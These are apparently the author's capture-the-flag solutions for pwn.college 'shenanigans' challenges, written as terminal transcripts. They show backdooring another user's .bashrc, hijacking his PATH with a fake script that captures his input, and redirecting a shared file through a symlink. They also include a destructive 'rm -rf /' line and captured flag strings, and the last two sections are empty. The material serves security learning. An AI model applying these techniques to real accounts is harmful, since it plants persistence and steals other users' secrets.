# Bashrc Backdoor
code:
```
hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag' >> /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{o3pTs37mFP4H708A_OAw5LyxxZx.0VMzEzNxwiMwEzNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```


# Sniffing Input
code:
```
hacker@shenanigans~sniffing-input:~$ mkdir -p /tmp/mybin
hacker@shenanigans~sniffing-input:~$ cat > /tmp/mybin/flag_checker <<'EOF'
> #!/bin/bash
> echo "Type the flag"
> read -r FLAG
> printf '%s\n' "$FLAG"
> EOF
hacker@shenanigans~sniffing-input:~$ chmod +x /tmp/mybin/flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'export PATH=/tmp/mybin:$PATH' >> /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
*************************************************************pwn.college{09WdqzdIe80XHcDl-DRjeslt1Zv.0VNzEzNxwiMwEzNzEzW}
zardus@shenanigans~sniffing-input:~$ exit
logout
```


# Overshared Directories
code:
```
hacker@shenanigans~overshared-directories:~$ mkdir -p /tmp/mybin
hacker@shenanigans~overshared-directories:~$ cat > /tmp/mybin/flag_checker <<'EOF'
> #!/bin/bash
> echo "Type the flag"
> read -r FLAG
> printf '%s\n' "$FLAG"
> EOF
hacker@shenanigans~overshared-directories:~$ chmod +x /tmp/mybin/flag_checker
hacker@shenanigans~overshared-directories:~$ mv /home/zardus/.bashrc /tmp/zardus.bashrc.back
hacker@shenanigans~overshared-directories:~$ cat > /home/zardus/.bashrc <<'EOF'
> export PATH=/tmp/mybin:$PATH
> EOF
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag
*************************************************************pwn.college{IEfDh7K67_c1fiZ6ZOUS_ZC43Fw.0FM0EzNxwiMwEzNzEzW}
zardus@shenanigans~overshared-directories:~$ exit
logout
```


# Tricky Linking 
code:
```
hacker@shenanigans~tricky-linking:~$ ls -l /tmp/collab/evil-commands.txt
-rw-r--r-- 1 zardus zardus 9 Oct 10 18:43 /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ cat /tmp/collab/evil-commands.txt
rm -rf /
hacker@shenanigans~tricky-linking:~$ rm -f /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: *********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ tail -n 20 /home/zardus/.bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: *********
pwn.college{gK0jgvlvpcY_J_Rrn3fJNarZpYK.0VM0EzNxwiMwEzNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```


# Sniffing Process Arguments
code:
```

```


#
code:
```

```
